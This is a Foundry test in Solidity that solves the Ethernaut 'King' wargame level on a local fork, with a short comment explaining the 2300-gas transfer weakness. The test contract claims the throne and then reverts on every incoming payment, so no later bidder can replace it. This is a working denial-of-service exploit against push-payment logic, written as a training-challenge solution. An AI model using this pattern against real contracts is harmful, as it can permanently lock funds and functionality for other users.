// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/09_King.sol";

/*
Author: @BoscoHuang

Analysis:
- transfer gas limit is 2300
- the attack contract don't have recieve/fallback function, will block the transfer
- or the attack contract has recieve/fallback function, but has the code in these funciton, willl trigger out of gas.


Command:
- forge test --match-contract KingTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract KingTest is DSTest {
    King Ethernaut09;

    function setUp() public {
        Ethernaut09 = King(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3));
    }

    function testEthernaut09() public {
        address(Ethernaut09).call{value: Ethernaut09.prize()}("");
        console.log("New king: ", Ethernaut09._king());
        assert(address(this) == Ethernaut09._king());

        (bool success, ) = address(Ethernaut09).call{value: Ethernaut09.prize()}("");
        console.log("New King Claims: ", success);
    }

    receive() external payable {
        revert("You can't defeat me");
    }

}